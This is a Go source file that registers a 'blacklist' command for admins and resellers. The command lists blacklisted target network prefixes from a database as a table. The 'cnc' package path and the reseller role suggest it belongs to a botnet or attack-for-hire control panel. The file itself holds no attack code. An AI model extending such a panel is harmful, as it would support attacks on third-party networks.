package commands

import (
	"cnc/internal/database"
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
	"fmt"
	"github.com/alexeyco/simpletable"
	"sort"
	"time"
)

func init() {
	command.Create(&command.Command{
		Aliases:     []string{"blacklist"},
		Roles:       []string{"admin", "reseller"},
		Description: "Easily manage blacklisted targets.",
		SubCommands: []*command.Command{
			command.SubCommandListCommand,
			commandBlacklistAdd,
			commandBlacklistRemove,
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			// retrieve all blacklisted targets from the database
			targets, err := database.Blacklist.SelectAll()
			if err != nil {
				return err
			}

			// sort by id
			sort.Slice(targets, func(i, j int) bool {
				return targets[i].ID < targets[j].ID
			})

			// create table & set headers
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "id"},
					{Align: simpletable.AlignCenter, Text: "prefix"},
					{Align: simpletable.AlignCenter, Text: "netmask"},
					{Align: simpletable.AlignCenter, Text: "creation date"},
				},
			}

			// go through all targets and add it to the cell
			for _, target := range targets {
				cell := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", target.ID)},
					{Align: simpletable.AlignLeft, Text: target.Prefix},
					{Align: simpletable.AlignRight, Text: fmt.Sprint(target.Netmask)},
					{Align: simpletable.AlignRight, Text: target.CreationDate.Format(time.RFC1123)},
				}

				table.Body.Cells = append(table.Body.Cells, cell)
			}

			// render table
			table.SetStyle(simpletable.StyleCompact)
			return session.Table(table, 1)
		},
	})
}
